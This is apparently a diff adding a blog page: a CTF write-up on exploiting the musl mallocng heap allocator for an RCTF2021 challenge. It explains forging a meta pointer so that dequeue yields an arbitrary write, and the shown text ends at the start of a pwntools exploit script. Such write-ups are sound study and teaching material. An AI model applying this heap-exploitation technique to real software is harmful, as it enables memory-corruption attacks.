@@ -1,0 +1,839 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>RCTF2021-musl-WP &amp;amp;&amp;amp; 5space 2021 *CTF 2022 强网杯 2022 Musl 赛题 exp - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="写在一年后 在现在向前看，发现自己也算半个 musl 大师了，自从 RCTF2021 的 musl 题之后的每场比赛只要出现 musl 我都能解出，也从最开始的写一天到现在的两三个小时打通，"><meta property="og:image" content><meta property="og:title" content="RCTF2021-musl-WP &amp;amp;&amp;amp; 5space 2021 *CTF 2022 强网杯 2022 Musl 赛题 exp"><meta property="og:description" content="写在一年后 在现在向前看，发现自己也算半个 musl 大师了，自从 RCTF2021 的 musl 题之后的每场比赛只要出现 musl 我都能解出，也从最开始的写一天到现在的两三个小时打通，"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1549.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-09-13T11:19:00+00:00"><meta property="article:modified_time" content="2021-09-13T11:19:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="RCTF2021-musl-WP &amp;amp;&amp;amp; 5space 2021 *CTF 2022 强网杯 2022 Musl 赛题 exp"><meta name=twitter:description content="写在一年后 在现在向前看，发现自己也算半个 musl 大师了，自从 RCTF2021 的 musl 题之后的每场比赛只要出现 musl 我都能解出，也从最开始的写一天到现在的两三个小时打通，"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>RCTF2021-musl-WP &amp;amp;&amp;amp; 5space 2021 *CTF 2022 强网杯 2022 Musl 赛题 exp</h1><div class=meta>Posted on Sep 13, 2021</div></div><section class=body><h1 id=写在一年后>写在一年后</h1><p>在现在向前看，发现自己也算半个 musl 大师了，自从 RCTF2021 的 musl 题之后的每场比赛只要出现 musl 我都能解出，也从最开始的写一天到现在的两三个小时打通，有时候还能拿个N血。这是什么原因呢？很简单，每道题都是换汤不换药，都是同样的攻击点，也就是 dequeue 操作，堆风水上稍稍有些区别，但也差不多，然后再开个 seccomp 恶心选手。很没有意思啦。还是希望 CTF 比赛不要盲目追求难度（特指的是各种严苛的而又重复的堆利用）能少出现一些重复的套路题，多一些有意思的题目。</p><h1 id=正文开始>正文开始</h1><p>这次的 RCTF 正好碰上军训，同级的队友只有我请出了假，所以基本上就只有三四个人在做题，非常的凄惨。pwn 题到最后一共放出来了 8 道，除了两个用 musl malloc 的题目之外代码都极度混乱，本身我的逆向能力比较弱，碰到这种题目就很头疼。我一共做出来两道题，musl 和 sharing。sharing 这题比较简单，就不写 wp 了，musl 这题应该也算一个比较裸的 musl malloc 利用。之前在 WMCTF 的时候有做过一道用 musl 1.1.4 的题目，musl malloc 在 1.2 之前和 ptmalloc2 比较相似，所以学习成本不高。本题用的是 musl 1.2.2，堆分配策略大改，比赛的时候就只能现学。近期的比赛中经常出现 musl 的堆题，不过 Musl-mallocng 的利用面现在来看非常窄，网络上的资料仅有利用 dequeue 任意地址写的一个利用点，碰到的题目都是使用这个点，这里就只简单写一下这个利用方法。更多关于 Musl-mallocng 的分配原理这里不写，因为我也不是很清楚，近期不是很有兴趣去学习。</p><h2 id=对-musl-的-dequeue-利用的简单分析>对 musl 的 dequeue 利用的简单分析</h2><p>这种利用类似 ptmalloc 中的 unlink 攻击，并且几乎没有保护。</p><p>musl 中，由一个 malloc_context 结构体管理整个堆，其定义为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_context</span> {
+</span></span><span style=display:flex><span>	<span style=color:#902000>uint64_t</span> secret;
+</span></span><span style=display:flex><span><span style=color:#007020>#ifndef PAGESIZE
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>	size_t pagesize;
+</span></span><span style=display:flex><span><span style=color:#007020>#endif
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>	<span style=color:#902000>int</span> init_done;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> mmap_counter;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>free_meta_head;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>avail_meta;
+</span></span><span style=display:flex><span>	size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta_area</span> <span style=color:#666>*</span>meta_area_head, <span style=color:#666>*</span>meta_area_tail;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>avail_meta_areas;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>active[<span style=color:#40a070>48</span>];
+</span></span><span style=display:flex><span>	size_t usage_by_class[<span style=color:#40a070>48</span>];
+</span></span><span style=display:flex><span>	<span style=color:#902000>uint8_t</span> unmap_seq[<span style=color:#40a070>32</span>], bounces[<span style=color:#40a070>32</span>];
+</span></span><span style=display:flex><span>	<span style=color:#902000>uint8_t</span> seq;
+</span></span><span style=display:flex><span>	uintptr_t brk;
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>实例名为 <code>ctx</code>，在 gdb 中可以用 <code>__malloc_context</code> 来访问。pagesize 这个变量默认是不会生效的。</p><p>malloc_context 管理的是 meta 和 meta_area 结构体，两者的定义为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> {
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>prev, <span style=color:#666>*</span>next;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>group</span> <span style=color:#666>*</span>mem;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>volatile</span> <span style=color:#902000>int</span> avail_mask, freed_mask;
+</span></span><span style=display:flex><span>	uintptr_t <span style=color:#002070;font-weight:700>last_idx</span>:<span style=color:#40a070>5</span>;
+</span></span><span style=display:flex><span>	uintptr_t <span style=color:#002070;font-weight:700>freeable</span>:<span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>	uintptr_t <span style=color:#002070;font-weight:700>sizeclass</span>:<span style=color:#40a070>6</span>;
+</span></span><span style=display:flex><span>	uintptr_t <span style=color:#002070;font-weight:700>maplen</span>:<span style=color:#40a070>8</span><span style=color:#666>*</span><span style=color:#007020;font-weight:700>sizeof</span>(uintptr_t)<span style=color:#666>-</span><span style=color:#40a070>12</span>;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta_area</span> {
+</span></span><span style=display:flex><span>	<span style=color:#902000>uint64_t</span> check;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta_area</span> <span style=color:#666>*</span>next;
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> nslots;
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> slots[];
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>分配给用户的内存是在一个个的 group 结构体中的，定义为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#define UNIT 16
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>group</span> {
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>meta;
+</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#002070;font-weight:700>active_idx</span>:<span style=color:#40a070>5</span>;
+</span></span><span style=display:flex><span>	<span style=color:#902000>char</span> pad[UNIT <span style=color:#666>-</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>) <span style=color:#666>-</span> <span style=color:#40a070>1</span>];  <span style=color:#60a0b0;font-style:italic>// 这里是 0x10 对齐
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> storage[];
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>每一个 group 结构体都有一个 meta 结构体管理。</p><p>上面列出了几个关键结构体，先有个印象就行。</p><p>首先，从管理器的最小单位说起，也就是分配给用户的 chunk。源码中并没有显式地定义出 chunk 结构体，实际上其结构为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>chunk</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#902000>uint8_t</span> idx;  <span style=color:#60a0b0;font-style:italic>// 低 5bit 作为 idx 表示这是 group 中第几个 chunk, 高3bit作为 reserved
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#902000>uint16_t</span> offset; <span style=color:#60a0b0;font-style:italic>// 与第一个 chunk 的偏移
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#902000>char</span> user_data[];
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>user_data 这里就是供用户使用的地方了。假设用户申请后获得的指针为 char *p，那么 p 就指向 user_data[] 的头部。而前面的 idx 和 offset 就是此 chunk 的元数据域了，仅占 4 Byte。</p><p>之前有说到，每个 group 由一个 meta 来管理，这个 meta 负责维护 group 内所有 chunk 的分配情况，group 的头部就保存了该 meta 结构体的指针，每个 chunk 的元数据存在的一个意义就是为了计算出此 chunk 所在的 group 结构体的头部，由此获得管理该 group 的 meta 指针。这个操作由 get_meta 函数完成，实现如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span><span style=color:#06287e>get_meta</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>p)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	assert(<span style=color:#666>!</span>((uintptr_t)p <span style=color:#666>&amp;</span> <span style=color:#40a070>15</span>));
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> offset <span style=color:#666>=</span> <span style=color:#666>*</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>uint16_t</span> <span style=color:#666>*</span>)(p <span style=color:#666>-</span> <span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> index <span style=color:#666>=</span> get_slot_index(p);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (p[<span style=color:#666>-</span><span style=color:#40a070>4</span>]) {
+</span></span><span style=display:flex><span>		assert(<span style=color:#666>!</span>offset);
+</span></span><span style=display:flex><span>		offset <span style=color:#666>=</span> <span style=color:#666>*</span>(<span style=color:#902000>uint32_t</span> <span style=color:#666>*</span>)(p <span style=color:#666>-</span> <span style=color:#40a070>8</span>);
+</span></span><span style=display:flex><span>		assert(offset <span style=color:#666>&gt;</span> <span style=color:#40a070>0xffff</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>group</span> <span style=color:#666>*</span>base <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>void</span> <span style=color:#666>*</span>)(p <span style=color:#666>-</span> UNIT<span style=color:#666>*</span>offset <span style=color:#666>-</span> UNIT);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>meta <span style=color:#666>=</span> base<span style=color:#666>-&gt;</span>meta;
+</span></span><span style=display:flex><span>	assert(meta<span style=color:#666>-&gt;</span>mem <span style=color:#666>==</span> base);
+</span></span><span style=display:flex><span>	assert(index <span style=color:#666>&lt;=</span> meta<span style=color:#666>-&gt;</span>last_idx);
+</span></span><span style=display:flex><span>	assert(<span style=color:#666>!</span>(meta<span style=color:#666>-&gt;</span>avail_mask <span style=color:#666>&amp;</span> (<span style=color:#40a070>1u</span><span style=color:#666>&lt;&lt;</span>index)));
+</span></span><span style=display:flex><span>	assert(<span style=color:#666>!</span>(meta<span style=color:#666>-&gt;</span>freed_mask <span style=color:#666>&amp;</span> (<span style=color:#40a070>1u</span><span style=color:#666>&lt;&lt;</span>index)));
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta_area</span> <span style=color:#666>*</span>area <span style=color:#666>=</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)((uintptr_t)meta <span style=color:#666>&amp;</span> <span style=color:#666>-</span><span style=color:#40a070>4096</span>);
+</span></span><span style=display:flex><span>	assert(area<span style=color:#666>-&gt;</span>check <span style=color:#666>==</span> ctx.secret);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (meta<span style=color:#666>-&gt;</span>sizeclass <span style=color:#666>&lt;</span> <span style=color:#40a070>48</span>) {
+</span></span><span style=display:flex><span>		assert(offset <span style=color:#666>&gt;=</span> size_classes[meta<span style=color:#666>-&gt;</span>sizeclass]<span style=color:#666>*</span>index);
+</span></span><span style=display:flex><span>		assert(offset <span style=color:#666>&lt;</span> size_classes[meta<span style=color:#666>-&gt;</span>sizeclass]<span style=color:#666>*</span>(index<span style=color:#666>+</span><span style=color:#40a070>1</span>));
+</span></span><span style=display:flex><span>	} <span style=color:#007020;font-weight:700>else</span> {
+</span></span><span style=display:flex><span>		assert(meta<span style=color:#666>-&gt;</span>sizeclass <span style=color:#666>==</span> <span style=color:#40a070>63</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (meta<span style=color:#666>-&gt;</span>maplen) {
+</span></span><span style=display:flex><span>		assert(offset <span style=color:#666>&lt;=</span> meta<span style=color:#666>-&gt;</span>maplen<span style=color:#666>*</span><span style=color:#40a070>4096UL</span><span style=color:#666>/</span>UNIT <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> (<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>)meta;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>为了弄清计算方法，先把所有的检查去掉</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>int</span> <span style=color:#06287e>get_slot_index</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>p)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> p[<span style=color:#666>-</span><span style=color:#40a070>3</span>] <span style=color:#666>&amp;</span> <span style=color:#40a070>31</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span><span style=color:#06287e>get_meta</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>p)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> offset <span style=color:#666>=</span> <span style=color:#666>*</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>uint16_t</span> <span style=color:#666>*</span>)(p <span style=color:#666>-</span> <span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> index <span style=color:#666>=</span> get_slot_index(p);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (p[<span style=color:#666>-</span><span style=color:#40a070>4</span>]) {
+</span></span><span style=display:flex><span>		offset <span style=color:#666>=</span> <span style=color:#666>*</span>(<span style=color:#902000>uint32_t</span> <span style=color:#666>*</span>)(p <span style=color:#666>-</span> <span style=color:#40a070>8</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>group</span> <span style=color:#666>*</span>base <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>void</span> <span style=color:#666>*</span>)(p <span style=color:#666>-</span> UNIT<span style=color:#666>*</span>offset <span style=color:#666>-</span> UNIT);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>meta <span style=color:#666>=</span> base<span style=color:#666>-&gt;</span>meta;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> (<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>)meta;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>传入的 p 指向用户数据区，<code>*(const uint16_t *)(p - 2)</code> 取得 offset 的值，然后通过 <code>const struct group *base = (const void *)(p - UNIT*offset - UNIT);</code> 计算出所在的 group 结构体的首地址。</p><p>那么我们考虑一下如何在这里伪造 meta。如果程序存在 4 字节以上的溢出，能够做到修改某个 chunk 的 offset，以修改为 0 为例，那么 base 的值就是 <code>p - 0x10</code> 了，返回的 meta 指针就是上一个 chunk 的最后 8 个字节的值了，这样可以起到伪造 meta 指针的效果（当然过程中要通过一些检查，这个等下再说）。</p><p>上面说了可以伪造 meta，那为啥要伪造 meta 呢，因为在 <code>nontrivial_free</code> 操作中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>mapinfo</span> <span style=color:#06287e>nontrivial_free</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>g, <span style=color:#902000>int</span> i)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#902000>uint32_t</span> self <span style=color:#666>=</span> <span style=color:#40a070>1u</span><span style=color:#666>&lt;&lt;</span>i;
+</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> sc <span style=color:#666>=</span> g<span style=color:#666>-&gt;</span>sizeclass;
+</span></span><span style=display:flex><span>	<span style=color:#902000>uint32_t</span> mask <span style=color:#666>=</span> g<span style=color:#666>-&gt;</span>freed_mask <span style=color:#666>|</span> g<span style=color:#666>-&gt;</span>avail_mask;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (mask<span style=color:#666>+</span>self <span style=color:#666>==</span> (<span style=color:#40a070>2u</span><span style=color:#666>&lt;&lt;</span>g<span style=color:#666>-&gt;</span>last_idx)<span style=color:#666>-</span><span style=color:#40a070>1</span> <span style=color:#666>&amp;&amp;</span> okay_to_free(g)) {
+</span></span><span style=display:flex><span>		<span style=color:#60a0b0;font-style:italic>// any multi-slot group is necessarily on an active list
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		<span style=color:#60a0b0;font-style:italic>// here, but single-slot groups might or might not be.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		<span style=color:#007020;font-weight:700>if</span> (g<span style=color:#666>-&gt;</span>next) {
+</span></span><span style=display:flex><span>			assert(sc <span style=color:#666>&lt;</span> <span style=color:#40a070>48</span>);
+</span></span><span style=display:flex><span>			<span style=color:#902000>int</span> activate_new <span style=color:#666>=</span> (ctx.active[sc]<span style=color:#666>==</span>g);
+</span></span><span style=display:flex><span>			dequeue(<span style=color:#666>&amp;</span>ctx.active[sc], g);
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>if</span> (activate_new <span style=color:#666>&amp;&amp;</span> ctx.active[sc])
+</span></span><span style=display:flex><span>				activate_group(ctx.active[sc]);
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> free_group(g);
+</span></span><span style=display:flex><span>	} <span style=color:#007020;font-weight:700>else</span> <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>mask) {
+</span></span><span style=display:flex><span>		assert(sc <span style=color:#666>&lt;</span> <span style=color:#40a070>48</span>);
+</span></span><span style=display:flex><span>		<span style=color:#60a0b0;font-style:italic>// might still be active if there were no allocations
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		<span style=color:#60a0b0;font-style:italic>// after last available slot was taken.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		<span style=color:#007020;font-weight:700>if</span> (ctx.active[sc] <span style=color:#666>!=</span> g) {
+</span></span><span style=display:flex><span>			queue(<span style=color:#666>&amp;</span>ctx.active[sc], g);
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	a_or(<span style=color:#666>&amp;</span>g<span style=color:#666>-&gt;</span>freed_mask, self);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> (<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>mapinfo</span>){ <span style=color:#40a070>0</span> };
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>存在一个 <code>dequeue</code> 操作，其实现是这样的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#902000>void</span> <span style=color:#06287e>dequeue</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>**</span>phead, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>meta</span> <span style=color:#666>*</span>m)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (m<span style=color:#666>-&gt;</span>next <span style=color:#666>!=</span> m) {
+</span></span><span style=display:flex><span>		m<span style=color:#666>-&gt;</span>prev<span style=color:#666>-&gt;</span>next <span style=color:#666>=</span> m<span style=color:#666>-&gt;</span>next;
+</span></span><span style=display:flex><span>		m<span style=color:#666>-&gt;</span>next<span style=color:#666>-&gt;</span>prev <span style=color:#666>=</span> m<span style=color:#666>-&gt;</span>prev;
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>*</span>phead <span style=color:#666>==</span> m) <span style=color:#666>*</span>phead <span style=color:#666>=</span> m<span style=color:#666>-&gt;</span>next;
+</span></span><span style=display:flex><span>	} <span style=color:#007020;font-weight:700>else</span> {
+</span></span><span style=display:flex><span>		<span style=color:#666>*</span>phead <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	m<span style=color:#666>-&gt;</span>prev <span style=color:#666>=</span> m<span style=color:#666>-&gt;</span>next <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>可以看到很像上古版本的 ptmalloc 的 unlink 操作，通过对一个伪造的 meta 进行 dequeue 操作，可以起到任意地址写的效果。</p><p>还有很多细节没说，之后有空再补。</p><h2 id=对题目的分析>对题目的分析</h2><p>漏洞点很明显，即 add 函数中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>  chunk_ptr<span style=color:#666>-&gt;</span>content <span style=color:#666>=</span> (<span style=color:#902000>char</span> <span style=color:#666>*</span>)malloc(size);
+</span></span><span style=display:flex><span>  chunk_ptr<span style=color:#666>-&gt;</span>size <span style=color:#666>=</span> size <span style=color:#666>-</span> <span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>  puts(<span style=color:#4070a0>&#34;Contnet?&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>readn</span>((<span style=color:#007020;font-weight:700>__int64</span>)chunk_ptr<span style=color:#666>-&gt;</span>content, chunk_ptr<span style=color:#666>-&gt;</span>size);<span style=color:#60a0b0;font-style:italic>// overflow
+</span></span></span></code></pre></div><p>size 为 0 时存在堆溢出，可以几乎无限溢出。</p><p>同时输入使用 read，没有 &lsquo;\0&rsquo; 截断，所以 leak 很容易</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>os <span style=color:#666>=</span> <span style=color:#4070a0>&#39;linux&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>arch <span style=color:#666>=</span> <span style=color:#4070a0>&#39;amd64&#39;</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process([&#34;./libc.so&#34;, &#34;./r&#34;])</span>
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so&#34;</span>)
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;123.60.25.24&#34;</span>, <span style=color:#40a070>12345</span>)
+</span></span><span style=display:flex><span>
